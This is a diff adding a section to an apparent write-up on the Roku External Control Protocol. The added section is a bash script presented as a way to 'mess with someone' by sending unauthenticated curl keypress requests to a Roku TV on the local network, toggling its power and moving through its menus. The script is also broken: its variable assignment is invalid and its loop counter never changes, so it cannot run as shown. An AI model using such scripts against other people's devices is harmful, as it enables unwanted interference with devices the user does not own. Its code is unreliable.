@@ -155,5 +155,37 @@ ________________________________________________________________________________
 
 There are numerous commands that can be issued via HTTP requests, so I have provided the table of potential ECPs that can be sent to the device:
 
+![ECP](https://user-images.githubusercontent.com/72598486/133323989-a69daa5c-eec8-41be-b520-8c955c499204.png)
 
+____________________________________________________________________________________________________________________________________________________________________
+
+## An Example Script for Having Fun
+____________________________________________________________________________________________________________________________________________________________________
+
+```
+#!/bin/bash
+# How to mess with someone who has a Roku TV 101
+Hahaha = 1
+while [ $Hahaha -le 100 ]
+do 
+curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
+curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
+curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
+curl -d '' "http://192.168.X.X:8060/keypress/powerOff"
+done
+curl -d '' "http://192.168.X.X:8060/keypress/powerOn"
+curl -d '' "http://192.168.X.X:8060/keypress/Home"
+while [ $Hahaha -le 100 ]
+do
+curl -d '' "http://192.168.X.X:8060/keypress/left"
+curl -d '' "http://192.168.X.X:8060/keypress/down"
+done
+echo "Can we still be friends?"
+```
+
+I hope that you learned something new, and if you need more information and resources on how to have more fun with these devices, check out https://developer.roku.com/docs/developer-program/debugging/external-control-api.md
+
+Happy hacking!
+
+wq!
 
